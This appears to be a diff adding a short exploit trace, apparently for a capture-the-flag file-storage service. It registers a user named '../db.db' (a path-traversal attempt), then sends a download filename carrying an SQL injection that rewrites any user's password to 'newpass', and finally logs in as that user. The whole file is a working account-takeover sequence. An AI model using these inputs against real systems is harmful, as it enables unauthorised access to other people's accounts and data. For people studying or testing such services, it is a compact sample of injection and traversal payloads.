@@ -1,0 +1,16 @@
+->REGISTER
+Login: ../db.db
+Password: 12345
+->LOGIN
+->ALLOCATE
+200
+->UPLOAD
+qwertyqwerty
+newfile
+->DOWNLOAD
+newfile'; UPDATE user SET password='newpass' WHERE name=<any_user>;--
+->LOGIN
+Login: <any_user>
+Password: newpass
+Hello, <any_user>
+   
